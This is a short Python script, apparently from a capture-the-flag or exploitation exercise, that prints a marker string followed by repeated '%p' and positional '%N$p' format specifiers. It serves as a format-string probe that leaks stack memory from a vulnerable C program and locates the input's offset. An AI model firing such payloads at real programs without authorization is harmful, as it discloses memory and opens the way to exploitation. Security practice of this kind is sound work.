def fun():
    print('AAAAAAAA', end='')
    for i in range(1, 40):
        print(f'%{i}$p', end='')


def fun2():
    print('CCCCCCCC', end='')
    for i in range(40):
        print(f'%p', end='')

fun2()